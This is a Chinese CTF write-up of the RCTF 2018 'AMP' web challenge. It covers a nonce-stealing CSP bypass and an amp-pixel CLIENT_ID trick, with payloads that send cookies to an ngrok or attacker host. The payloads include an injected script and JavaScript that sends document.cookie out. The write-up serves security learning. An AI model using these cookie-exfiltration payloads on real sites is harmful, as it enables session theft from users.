> 原文链接: https://www.anquanke.com//post/id/145885 


# 2018 RCTF-WEB题 AMP记录


                                阅读量   
                                **145665**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/dm/1024_649_/t01692b068bcea16b2e.png)](https://p3.ssl.qhimg.com/dm/1024_649_/t01692b068bcea16b2e.png)

这是一道RCTF2018的web题，22solved<br>
题目地址<br>[http://amp.2018.teamrois.cn](http://amp.2018.teamrois.cn)<br>
github地址：<br>[https://github.com/zsxsoft/my-rctf-2018/tree/master/amp](https://github.com/zsxsoft/my-rctf-2018/tree/master/amp)

### 

## 0x01 尝试

打开页面，提示输入name作为请求参数：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/3118054203.png)

测试name参数yunsle，页面提示如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/1803830394.png)

点击STOP TRACKING ME后，提示将会记录请求request并发送给admin：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/3377454404.png)

查看cookie内容，发现提示，flag在admin的cookie中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/3138808685.png)

提示中提到记录请求以及将会发送给admin，很自然地想到XSS，于是尝试name参数：

```
http://amp.2018.teamrois.cn/?name=%3Cscript%3Ealert(1)%3C/script%3E
```

但是页面并没有弹窗，并且在控制台输出：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/2222442631.png)

查看http响应头，发现了做了CSP内容安全策略，并且设置了script-src<br>
了解CSP可以看这里：[https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP](https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/4155467236.png)

script-src属性开启将对当前页面上可执行的JS源进行了限制<br>
查看源代码可以看到，所有引用的JS都申明了一个nonce属性，nonce属性中的value是服务端随机生成的字符串<br>
只有申明了nonce属性，并且nonce值和服务端随机数一致时才能执行JS来源：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/3884006733.png)

于是，自然地，尝试绕过这里的CSP规则<br>
之前有看到过针对nonce的绕过操作，是利用页面上XSS点之后较近的JS引用中的nonce属性，简单来说可以看下面实例：

```
&lt;p&gt;这是插入点&lt;/p&gt;
&lt;script src="xxx" nonce="AAAAAAAAAAA"&gt;&lt;/script&gt;
```

当插入点可控时，可以建立如下的payload：

```
&lt;script src="http//yourvps/test.js" a="

```

此时，payload插入之后的页面上，将变成：

```
&lt;p&gt;&lt;script src="http//yourvps/test.js" a="&lt;/p&gt;
&lt;script src="xxx" nonce="AAAAAAAAAAA"&gt;&lt;/script&gt;
```

这样就讲nonce包含到了构建的JS引用中，导致绕过

在这里，用上述绕过姿势引入放在服务器上的JS代码，在代码中创建img标签，在img的src中加入cookie值<br>
最后src中将打到ngrox上<br>
构建payload如下：

```
http://amp.2018.teamrois.cn/?name=&lt;script src="http://vps/1.js" a="
```

服务器上JS内容：

```
var img = document.createElement('img');
img.src = 'http://ec492eb4.ngrok.io/3333='+encodeURIComponent(document.cookie);
```

name参数设置为payload提交后，查看本地浏览器已经执行了从服务器上加载的JS代码，并且将本地的cookie打到了ngrox：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/2479288435.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/1166455824.png)

接下来点击STOP TRACKING ME按钮后，等待服务器端admin查看页面，将cookie打过来<br>
但是等了一会后，接收到的打过来的cookie依然不是真正的flag！<br>
到这里就懵逼了，打回来的cookie里面仍然是提示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/91193408.png)

用ceye再尝试接收了一次，仍然是失败的结果：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/4078066859.png)



## 0x02 复现

等比赛结束，看WP后发现，考点是在AMP上（题目和代码注释里都提示了，然而没有去想。。）<br>
AMP的官网：<br>[https://www.ampproject.org/zh_cn/](https://www.ampproject.org/zh_cn/)<br>
简单介绍就是：



> <p><code>谷歌AMP（Accelerated Mobile Pages，加速移动页面）是Google推出法人一种为静态内容构建 web 页面，提供可靠和快速的渲染，加快页面加载的时间，特别是在移动 Web 端查看内容的时间。<br>
AMP HTML 完全是基于现有 web 技术构建的，通过限制一些 HTML，CSS 和 JavaScript 部分来提供可靠的性能。这些限制是通过 AMP HTML 一个验证器强制执行的。为了弥补这些限制，AMP HTML 定义了一系列超出基础 HTML 的自定义元素来丰富内容。</code></p>

这题的页面中，使用了AMP，因此就引入了AMP的标签，这就引入了AMP标签的一些特性

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/326408404.png)

官方文档中，有如下的介绍：

```
AMP 提供了以下两个组件，可满足您的分析和衡量需求：amp-pixel 和 amp-analytics。两个组件都会将分析数据发送到定义的端点。
如果您只是跟踪诸如简单的跟踪像素之类的行为，则可以使用 amp-pixel 组件，它提供了基本的网页浏览跟踪功能；网页浏览数据将发送到定义的网址。某些与供应商的集成功能可能需要使用此组件，在这种情况下，这些集成功能将指定确切的网址端点。
```

在官方文档上，对amp-pixel标签有这样一个代码实例：

```
mp-pixel 的简单配置
要创建简单的 amp-pixel 配置，请在 AMP 网页的正文中插入下方示例所示的类似内容：

&lt;amp-pixel src="https://foo.com/pixel?RANDOM"&gt;&lt;/amp-pixel&gt;
&lt;amp-pixel src="https://foo.com/pixel?cid=CLIENT_ID(cid-scope-cookie-fallback-name)"&gt;&lt;/amp-pixel&gt;
```

其中cid-scope-cookie-fallback-name意思是：文档未由AMP代理服务时，备用cookie的名称，如果未提供，则cid作用域将用作cookie名称。<br>
于是当构建如下payload时：

```
&lt;amp-pixel src="https://YOUR_WEBSITE/?cid=CLIENT_ID(FLAG)"&gt;&lt;/amp-pixel&gt;
```

将会把cookie的FLAG的值赋值为变量值

对以上payload进行复现尝试，拿到flag：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/3462475756.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/2902923243.png)



## 0x03 总结

做题还是有一个快速学习能力的要求，很多东西都是在题目刚刚接触时才会接触到一个新的事物。这时候就需要快速对新事物进行了解，并且找到利用点，这点是最重要的。

另外，这题中AMP的功能和标签要能生效，必须要能走https协议并且不能挂Burpsuit代理<br>
如果挂了代理，https协议失效，v0.js并没有真正生效，AMP标签也会失效：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/1933544933.png)

在一开始做题的时候，开了浏览器的Burpsuit代理，所以使用CSP绕过payload可以提交上去（没有被AMP加载的v0.js禁止），但是打不到flag<br>
当不走Burpsuit的时候，payload是提交不了的，会被AMP加载的JS限制，如图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://www.yourhome.ren/usr/uploads/2018/05/1550816835.png)
